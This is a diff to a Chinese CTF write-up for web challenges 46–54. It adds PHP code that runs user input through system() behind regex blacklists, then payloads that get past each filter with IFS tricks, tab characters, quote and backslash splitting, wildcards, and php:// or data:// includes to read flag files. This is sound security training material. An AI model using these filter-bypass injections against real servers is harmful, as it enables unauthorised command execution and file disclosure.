@@ -330,7 +330,7 @@ GET：`?c=include$_GET[1]?>&1=php://input`
 
 POST：`<?php system('tac flag.php');?>`
 
-**注意**：因为POST没有按照key=value封装数据，因此hackBar认为数据有问题，不会发送数据，可以使用Burp Suite发送数据。**!!注意!! php://input别使用hakebar，用BurpSuite**
+**注意**：因为POST没有按照key=value封装数据，因此hackBar认为数据有问题，不会发送数据，可以使用Burp Suite发送数据。**!!注意!! php://input别使用hackbar，用BurpSuite**
 
 **补充:**    `php://input`默认读取没有处理过的POST数据
 
@@ -345,7 +345,7 @@ POST：`<?php system('tac flag.php');?>`
 
 `?c=include%0a$_GET[a]?>&a=data://text/plain,<?php system("tac fla*");?>`
 
-这个不知道为什么也是在hakebar里面发送不出去，直接在浏览器地址栏里面弄就好了
+这个不知道为什么也是在hackbar里面发送不出去，直接在浏览器地址栏里面弄就好了
 
 
 
@@ -549,3 +549,226 @@ if (isset($_GET['c'])) {
 ```
 
 或者直接`%09`：`?c=tac%09fl*||`。
+
+
+
+
+
+## Web 46
+
+代码如下：
+
+```php
+<?php
+if (isset($_GET['c'])) {
+    $c = $_GET['c'];
+    if (!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)) {
+        system($c . " >/dev/null 2>&1");
+    }
+} else {
+    highlight_file(__FILE__);
+}
+```
+
+官方：`?c=nl<fla''g.php||`
+
+或者：`?c=tac%09fla?.php||`
+
+或者：`?c=ca\t<fl\ag.php||`
+
+或者：`?c=tac<fla%27%27g.php||`
+
+
+
+几种绕过空格的方式 `{cat,flag.txt}`、`cat${IFS}flag.txt`、`cat$IFS$9flag.txt`、`cat<flag.txt`//这俩<>貌似没啥用 `cat<>flag.txt`
+
+最后是`cat%0afla?.php`、`cat%09fla?.php`，这俩的区别是前者（%0a经过URL解码是换行的意思）可以用来做末尾的截断，后者（%09是tab的意思）用于语句中间。
+
+
+
+
+
+## Web 47
+
+代码如下：
+
+```php
+<?php
+if (isset($_GET['c'])) {
+    $c = $_GET['c'];
+    if (!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)) {
+        system($c . " >/dev/null 2>&1");
+    }
+} else {
+    highlight_file(__FILE__);
+}
+?>
+```
+
+官方：`?c=nl<fla''g.php||`
+
+或者：`?c=tac%09fla?.php||`
+
+或者：`?c=tac<f''lag.php||`
+
+
+
+
+
+## Web 48
+
+代码如下：
+
+```php
+<?php
+if (isset($_GET['c'])) {
+    $c = $_GET['c'];
+    if (!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)) {
+        system($c . " >/dev/null 2>&1");
+    }
+} else {
+    highlight_file(__FILE__);
+}
+?>
+```
+
+官方：`?c=nl<fla''g.php||`（注意一定要两个单引号去闭合）
+
+或者：`?c=tac<fla%27%27g.php||`
+
+`?c=tac%09fla\g.php%0a` 其中%0a经过URL解码是换行的意思，%09是tab的意思
+
+
+
+
+
+## Web 49
+
+代码如下：
+
+```php
+<?php
+if (isset($_GET['c'])) {
+    $c = $_GET['c'];
+    if (!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)) {
+        system($c . " >/dev/null 2>&1");
+    }
+} else {
+    highlight_file(__FILE__);
+}
+
+```
+
+官方：`?c=nl<fla''g.php||`
+
+或者：`?c=tac%09fla?????%26`（`%26`是`&`）
+
+或者：`?c=tac%09fla?.php||`
+
+
+
+
+
+## Web 52
+
+代码如下：
+
+```php
+<?php
+if (isset($_GET['c'])) {
+    $c = $_GET['c'];
+    if (!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)) {
+        system($c . " >/dev/null 2>&1");
+    }
+} else {
+    highlight_file(__FILE__);
+}
+```
+
+**空格的另一种绕过方法**
+
+官方：`?c=nl$IFS/fla''g||`
+
+或者：`?c=nl${IFS}/fla''g%0a`
+
+或者：`?c=ca\t$IFS/fla''g||`
+
+或者：`?c=ca\t${IFS}/fla?||`
+
+
+
+
+
+## Web 53
+
+代码如下：
+
+```php
+<?php
+if (isset($_GET['c'])) {
+    $c = $_GET['c'];
+    if (!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)) {
+        echo ($c);
+        $d = system($c);
+        echo "<br>" . $d;
+    } else {
+        echo 'no';
+    }
+} else {
+    highlight_file(__FILE__);
+}
+
+```
+
+官方：`?c=c''at${IFS}fla''g.p''hp`
+
+或者：`?c=s''ort${IFS}f???????%0a`
+
+或者：`?c=ca''t${IFS}fla''g.php`
+
+或者：`?c=ta\c${IFS}fla\g.php`
+
+或者：`?c=ca\t${IFS}fla?.php`
+
+
+
+
+
+## Web 54
+
+```php
+<?php
+if (isset($_GET['c'])) {
+    $c = $_GET['c'];
+    if (!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)) {
+        system($c);
+    }
+} else {
+    highlight_file(__FILE__);
+}
+
+```
+
+官方：`/bin/?at${IFS}f???????`
+
+先直接`?c=ls`，得到`flag.php index.php`
+
+
+
+解法一：
+
+使用使用mv命令把flag文件重命名，再使用uniq查看a.txt（如果第二步看不到，请右键查看文件源代码）
+
+第一步：`?c=mv${IFS}fla?.php${IFS}a.txt`
+第二步：`c=uniq${IFS}a.txt` ，其实直接访问a.txt也行
+
+这儿有两个新东西，第一个是`mv`命令，第二个是`uniq`。
+
+
+
+解法二：`?c=grep${IFS}%27fla%27${IFS}f???????%0a`
+
+菜鸟教程的grep：[Linux grep 命令](https://www.runoob.com/linux/linux-comm-grep.html)
+
+
+
